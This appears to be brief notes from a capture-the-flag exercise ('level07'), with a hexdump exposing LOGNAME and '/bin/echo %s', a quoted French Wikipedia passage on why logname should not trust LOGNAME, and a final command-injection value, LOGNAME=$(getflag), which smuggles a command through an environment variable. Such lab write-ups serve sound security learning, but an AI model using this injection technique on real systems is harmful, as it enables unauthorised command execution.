`hexdump -C level07`

> 00000680  4c 4f 47 4e 41 4d 45 00  2f 62 69 6e 2f 65 63 68  |LOGNAME./bin/ech|
> 00000690  6f 20 25 73 20 00 00 00  01 1b 03 3b 30 00 00 00  |o %s ......;0...|

https://fr.wikipedia.org/wiki/Logname

> logname est une commande Unix abréviation de "Login Name", qui affiche le nom d'utilisateur courant.
> Cette commande ne doit pas utiliser la variable d'environnement LOGNAME, qui a pu être modifiée.

`LOGNAME=$\(getflag\)
